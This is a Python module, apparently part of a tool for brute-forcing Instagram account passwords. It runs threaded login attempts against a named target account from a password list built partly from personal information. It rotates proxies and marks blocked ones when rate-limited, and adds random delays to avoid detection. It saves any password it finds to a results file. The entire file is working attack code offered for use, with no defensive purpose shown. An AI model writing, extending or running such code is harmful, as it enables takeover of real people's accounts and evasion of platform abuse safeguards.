#!/usr/bin/env python3
import os
import time
import json
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from .session_manager import InstagramSession
from .proxy_rotator import ProxyRotator
from .config import OUTPUT_DIR, MAX_ATTEMPTS_PER_IP, COOLDOWN_PERIOD
from .banner import R, Y, G, RE

class BruteAttacker:
    def __init__(self, username, passwords, proxy_rotator=None):
        self.username = username
        self.passwords = passwords
        self.total_passwords = len(passwords)
        self.proxy_rotator = proxy_rotator or ProxyRotator()
        self.attempted = 0
        self.found = False
        self.correct_password = None
        self.lock = threading.Lock()
        self.stop_flag = threading.Event()
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        self.results_file = os.path.join(OUTPUT_DIR, f"{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        self.stats = {
            "start_time": datetime.now().isoformat(),
            "attempts": 0,
            "rate_limited": 0,
            "network_errors": 0,
            "checkpoints": 0,
            "proxy_rotations": 0,
            "found_password": None,
        }

    def start_attack(self, threads=3, callback=None):
        print(f"\n{R}[!] Starting Brute Force Attack{RE}")
        print(f"{Y}[*] Target: @{self.username}{RE}")
        print(f"{Y}[*] Passwords to test: {self.total_passwords:,}{RE}")
        print(f"{Y}[*] Threads: {threads}{RE}")
        print(f"{Y}[*] Strategy: Smart rotation with random delays{RE}")
        print(f"{R}{'=' * 60}{RE}\n")

        if self.total_passwords == 0:
            print(f"{R}[!] No passwords to test{RE}")
            return None

        chunk_size = max(1, self.total_passwords // threads)
        chunks = []
        for i in range(threads):
            start = i * chunk_size
            end = start + chunk_size if i < threads - 1 else self.total_passwords
            chunks.append(self.passwords[start:end])

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(self._attack_worker, chunk, i, callback) for i, chunk in enumerate(chunks)]
            for future in as_completed(futures):
                if self.found:
                    self.stop_flag.set()
                    break
                try:
                    future.result()
                except Exception as e:
                    print(f"{R}[!] Worker error: {e}{RE}")

        self._save_results()

        if self.found:
            print(f"\n{G}{'=' * 60}{RE}")
            print(f"{G}[+] PASSWORD FOUND!{RE}")
            print(f"{G}[+] Username: {self.username}{RE}")
            print(f"{G}[+] Password: {self.correct_password}{RE}")
            print(f"{G}[+] Results saved to: {self.results_file}{RE}")
            print(f"{G}{'=' * 60}{RE}\n")
        else:
            print(f"\n{Y}[!] Password not found in generated list{RE}")
            print(f"{Y}[!] Consider adding more personal information{RE}")
        return self.correct_password

    def _attack_worker(self, password_chunk, worker_id, callback=None):
        session = None
        proxy = None
        local_attempts = 0

        for password in password_chunk:
            if self.stop_flag.is_set():
                break

            with self.lock:
                self.attempted += 1
                self.stats["attempts"] += 1
                current_attempt = self.attempted

            if local_attempts >= MAX_ATTEMPTS_PER_IP or not session:
                proxy = self.proxy_rotator.get_next_proxy()
                if session:
                    try:
                        session.reset_session()
                    except Exception:
                        pass
                session = InstagramSession(proxy=proxy)
                local_attempts = 0
                with self.lock:
                    self.stats["proxy_rotations"] += 1

            success, response = session.attempt_login(self.username, password)
            local_attempts += 1
            self.proxy_rotator.report_attempt()

            if success:
                with self.lock:
                    self.found = True
                    self.correct_password = password
                    self.stats["found_password"] = password
                self.stop_flag.set()
                return

            error_type = response.get("error", "unknown") if isinstance(response, dict) else "unknown"
            if error_type == "rate_limited":
                with self.lock:
                    self.stats["rate_limited"] += 1
                self.proxy_rotator.mark_blocked(proxy)
                local_attempts = MAX_ATTEMPTS_PER_IP
                time.sleep(COOLDOWN_PERIOD / 4)
            elif error_type == "checkpoint_required":
                with self.lock:
                    self.stats["checkpoints"] += 1
                time.sleep(random.uniform(5, 10))
            elif error_type == "network_error":
                with self.lock:
                    self.stats["network_errors"] += 1
                time.sleep(random.uniform(3, 6))

            if callback and current_attempt % 50 == 0:
                callback(current_attempt, self.total_passwords, self.stats)

            if not self.found:
                time.sleep(self.proxy_rotator.get_random_delay())

            if current_attempt % 100 == 0:
                progress = (current_attempt / max(self.total_passwords, 1)) * 100
                print(
                    f"    [W{worker_id}] Attempt {current_attempt:,}/{self.total_passwords:,} "
                    f"({progress:.1f}%) | Rate limits: {self.stats['rate_limited']} | "
                    f"Rotations: {self.stats['proxy_rotations']}"
                )

        if session:
            try:
                session.reset_session()
            except Exception:
                pass

    def _save_results(self):
        self.stats["end_time"] = datetime.now().isoformat()
        self.stats["found"] = self.found
        self.stats["correct_password"] = self.correct_password
        self.stats["total_passwords_tested"] = self.total_passwords
        with open(self.results_file, "w", encoding="utf-8") as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)
